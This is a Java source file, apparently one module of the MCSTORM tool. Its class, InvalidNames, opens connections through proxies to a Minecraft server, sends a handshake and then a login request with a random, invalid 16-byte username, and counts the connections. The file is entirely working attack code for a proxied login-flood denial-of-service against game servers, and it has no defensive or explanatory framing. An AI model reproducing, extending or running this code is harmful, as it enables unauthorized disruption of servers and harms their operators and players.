package io.MCSTORM.methods;


import io.MCSTORM.Main;
import io.MCSTORM.utils.Handshake;
import io.MCSTORM.utils.LoginRequest;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.nio.charset.StandardCharsets;
import java.util.Random;


public class InvalidNames
        implements Method {
    private Handshake handshake;
    private byte[] bytes;


    public InvalidNames() {
        if (!Main.http) {
            this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
            this.bytes = this.handshake.getWrappedPacket();
        }
    }


    private String randomString(int len) {
        byte[] array = new byte[len];
        (new Random()).nextBytes(array);
        return new String(array, StandardCharsets.UTF_8);

    }


    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString(16))).getWrappedPacket()));
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();

    }

}


